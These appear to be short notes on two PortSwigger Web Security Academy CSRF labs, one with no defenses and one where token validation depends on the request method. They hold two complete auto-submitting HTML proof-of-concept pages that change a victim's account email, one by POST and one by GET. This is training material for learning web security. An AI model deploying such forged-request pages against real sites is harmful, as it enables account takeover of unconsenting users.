___

Engagement tools / Generate CSRF PoC

Enable the option to include an auto-submit script and click "Regenerate".
# CSRF vulnerability with no defenses

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a670050040a93f380ec30c9001f00b8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="dani@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF where token validation depends on request method

With POST --> missing parameter CSRF

GET


```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ab3000303d506d3801d35f700120019.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="dani@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


